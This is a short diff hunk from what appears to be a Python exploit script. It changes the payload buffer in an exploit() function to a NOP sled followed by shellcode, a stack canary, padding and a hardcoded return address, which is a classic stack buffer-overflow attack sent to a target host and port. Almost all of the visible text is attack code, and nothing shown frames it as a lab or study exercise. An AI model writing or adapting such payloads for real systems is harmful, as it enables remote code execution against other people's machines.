@@ -63,7 +63,7 @@ def exploit(host, port, shellcode):
 
     time.sleep(5)
     # construct query to unlink
-    buf_str = shellcode + "A" * (2048 - len(shellcode)) + canary + "A" * 4 + "\x6c\xee\xff\xbf"
+    buf_str = "\x90" * (2048 - len(shellcode)) + shellcode + canary + "A" * 12 + "\x00\xf0\xff\xbf"
     if try_exploit(buf_str, host, port):
         print "failed"
     else:
